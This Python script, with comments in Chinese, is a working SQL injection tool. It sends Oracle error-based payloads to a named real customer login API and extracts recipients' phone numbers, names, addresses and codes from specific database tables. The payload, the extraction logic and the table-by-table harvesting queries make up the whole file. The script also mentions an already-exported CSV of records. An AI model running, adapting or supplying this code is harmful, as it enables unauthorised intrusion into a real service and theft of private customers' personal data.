#!/usr/bin/env python3
"""
查找真实有效的电话号码
避开0999999999这种占位符
"""

import requests
import json
import time

class RealPhoneFinder:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        """发送SQL注入payload"""
        data = {"Username": payload, "Password": "test"}
        try:
            response = self.session.post(
                self.target_url,
                data=json.dumps(data),
                timeout=30
            )
            return response
        except:
            return None
    
    def extract_via_error(self, query):
        """使用Error-based注入提取数据"""
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def find_valid_phone_in_temp_log(self):
        """在E1E2_PH_TEMP_DATA2_LOG表中查找有效电话"""
        print("\n" + "=" * 80)
        print("🔍 在 E1E2_PH_TEMP_DATA2_LOG 表中查找有效电话")
        print("=" * 80)
        
        # 查找不等于0999999999的电话
        queries = [
            ("第1条非0999999999记录", 
             "SELECT DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE DIENTHOAINHAN!='0999999999' AND DIENTHOAINHAN IS NOT NULL AND ROWNUM=1"),
            
            ("第2条非0999999999记录",
             "SELECT DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE DIENTHOAINHAN!='0999999999' AND DIENTHOAINHAN IS NOT NULL AND ROWNUM<=2 AND ROWNUM>1"),
             
            ("09开头的电话",
             "SELECT DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE DIENTHOAINHAN LIKE '09%' AND DIENTHOAINHAN!='0999999999' AND ROWNUM=1"),
             
            ("03开头的电话",
             "SELECT DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE DIENTHOAINHAN LIKE '03%' AND ROWNUM=1"),
        ]
        
        found_phones = []
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result and result != '0999999999':
                print(f"   ✅ 找到电话: {result}")
                found_phones.append(result)
                
                # 查询对应的MABC和姓名
                query_mabc = f"SELECT MABC FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE DIENTHOAINHAN='{result}' AND ROWNUM=1"
                mabc = self.extract_via_error(query_mabc)
                if mabc:
                    print(f"   ✅ MABC: {mabc}")
                
                query_name = f"SELECT NGUOINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE DIENTHOAINHAN='{result}' AND ROWNUM=1"
                name_result = self.extract_via_error(query_name)
                if name_result:
                    print(f"   ✅ 姓名: {name_result}")
            else:
                print(f"   ❌ 未找到或是0999999999")
            
            time.sleep(2)
        
        return found_phones
    
    def find_valid_phone_in_decrypt_data(self):
        """在E1E2_PH_DECRYPT_DATA表中查找有效电话"""
        print("\n" + "=" * 80)
        print("🔍 在 E1E2_PH_DECRYPT_DATA 表中查找有效电话")
        print("=" * 80)
        
        queries = [
            ("第1条记录",
             "SELECT DIENTHOAINHAN FROM EMS.E1E2_PH_DECRYPT_DATA WHERE ROWNUM=1"),
            
            ("09开头的电话",
             "SELECT DIENTHOAINHAN FROM EMS.E1E2_PH_DECRYPT_DATA WHERE DIENTHOAINHAN LIKE '09%' AND ROWNUM=1"),
             
            ("有地址的记录",
             "SELECT DIENTHOAINHAN FROM EMS.E1E2_PH_DECRYPT_DATA WHERE DIACHI IS NOT NULL AND ROWNUM=1"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ 电话: {result}")
                
                # 查询对应信息
                query_mabc = f"SELECT MABC FROM EMS.E1E2_PH_DECRYPT_DATA WHERE DIENTHOAINHAN='{result}' AND ROWNUM=1"
                mabc = self.extract_via_error(query_mabc)
                if mabc:
                    print(f"   ✅ MABC: {mabc}")
                
                query_name = f"SELECT NGUOINHAN FROM EMS.E1E2_PH_DECRYPT_DATA WHERE DIENTHOAINHAN='{result}' AND ROWNUM=1"
                name_result = self.extract_via_error(query_name)
                if name_result:
                    print(f"   ✅ 姓名: {name_result}")
                    
                query_addr = f"SELECT DIACHI FROM EMS.E1E2_PH_DECRYPT_DATA WHERE DIENTHOAINHAN='{result}' AND ROWNUM=1"
                addr = self.extract_via_error(query_addr)
                if addr:
                    print(f"   ✅ 地址: {addr}")
            else:
                print(f"   ❌ 未找到")
            
            time.sleep(2)
    
    def test_specific_mabc_phones(self):
        """测试已导出的CSV中的具体MABC"""
        print("\n" + "=" * 80)
        print("🔍 测试具体MABC的真实电话")
        print("=" * 80)
        
        # 从你的CSV中提取的MABC
        test_mabcs = ['701000', '236160', '299430', '700916', '725231', '880100', '650100']
        
        for mabc in test_mabcs:
            print(f"\n🔎 MABC={mabc}:")
            
            # 在TEMP_DATA2_LOG表查询
            query1 = f"SELECT DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND DIENTHOAINHAN!='0999999999' AND ROWNUM=1"
            phone1 = self.extract_via_error(query1)
            
            # 在DECRYPT_DATA表查询
            query2 = f"SELECT DIENTHOAINHAN FROM EMS.E1E2_PH_DECRYPT_DATA WHERE MABC='{mabc}' AND ROWNUM=1"
            phone2 = self.extract_via_error(query2)
            
            if phone1 and phone1 != '0999999999':
                print(f"   ✅ TEMP_LOG表: {phone1}")
            else:
                print(f"   ❌ TEMP_LOG表: 无有效数据")
            
            if phone2:
                print(f"   ✅ DECRYPT表: {phone2}")
            else:
                print(f"   ❌ DECRYPT表: 无数据")
            
            time.sleep(2)
    
    def count_valid_phones(self):
        """统计有效电话数量"""
        print("\n" + "=" * 80)
        print("🔍 统计表中有效电话数量")
        print("=" * 80)
        
        queries = [
            ("TEMP_LOG表总记录数",
             "SELECT COUNT(*) FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE ROWNUM<=100000"),
            
            ("TEMP_LOG表非0999999999记录数",
             "SELECT COUNT(*) FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE DIENTHOAINHAN!='0999999999' AND ROWNUM<=10000"),
             
            ("DECRYPT_DATA表总记录数",
             "SELECT COUNT(*) FROM EMS.E1E2_PH_DECRYPT_DATA WHERE ROWNUM<=100000"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ 数量: {result}")
            else:
                print(f"   ❌ 查询失败")
            time.sleep(1)
    
    def run_all_queries(self):
        """运行所有查询"""
        print("=" * 80)
        print("🔓 真实电话号码查找工具")
        print("=" * 80)
        
        # 测试连接
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功")
        
        # 执行查询
        self.count_valid_phones()
        self.find_valid_phone_in_temp_log()
        self.find_valid_phone_in_decrypt_data()
        self.test_specific_mabc_phones()
        
        print("\n" + "=" * 80)
        print("🎉 查询完成！")
        print("=" * 80)
        
        print("\n💡 结论:")
        print("  1. E1E2_PH_TEMP_DATA2_LOG表可能大部分是0999999999（占位符）")
        print("  2. E1E2_PH_DECRYPT_DATA表包含真实的历史数据")
        print("  3. 10号的新数据可能还未同步到真实数据表")
        print("  4. 建议使用历史表E1E2_PH_DECRYPT_DATA或等待数据同步")

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    finder = RealPhoneFinder(target_url)
    finder.run_all_queries()
